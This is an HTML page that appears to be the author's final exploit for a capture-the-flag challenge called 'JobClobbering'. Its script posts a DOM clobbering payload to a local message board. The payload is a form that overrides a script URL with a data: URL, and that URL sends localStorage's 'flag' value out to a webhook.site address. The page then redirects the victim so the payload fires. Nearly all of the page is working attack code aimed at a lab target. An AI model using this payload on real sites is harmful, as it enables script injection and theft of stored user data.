     <!DOCTYPE html>
     <html>
     <head>
         <title>JobClobbering Final Exploit</title>
     </head>
     <body>
         <script>
             // Final exploit for JobClobbering CTF challenge
             // This posts a DOM clobbering message and redirects to trigger it

             async function exploit() {
                 try {
                     // Post the DOM clobbering payload
                     const response = await fetch('http://localhost:8399/messages', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
                             name: 'pwned',
                             message: '<form id="utilsJS"><input name="url" 
     value="data:text/javascript,fetch(\'https://webhook.site/fb541f2b-805b-4e45-80bc-e836c1231007?flag=\' + 
     localStorage.getItem(\'flag\'))"></form>'
                         })
                     });

                     if (response.ok) {
                         console.log('Payload posted successfully');
                         // Wait a moment then redirect to trigger the vulnerability
                         setTimeout(() => {
                             window.location.href = 'http://localhost:8399/#messages';
                         }, 1000);
                     } else {
                         console.error('Failed to post payload');
                         // Try to navigate anyway in case payload is already there
                         window.location.href = 'http://localhost:8399/#messages';
                     }
                 } catch (error) {
                     console.error('Error:', error);
                     // Try to navigate anyway
                     window.location.href = 'http://localhost:8399/#messages';
                 }
             }

             // Execute the exploit
             exploit();
         </script>
     </body>
     </html>
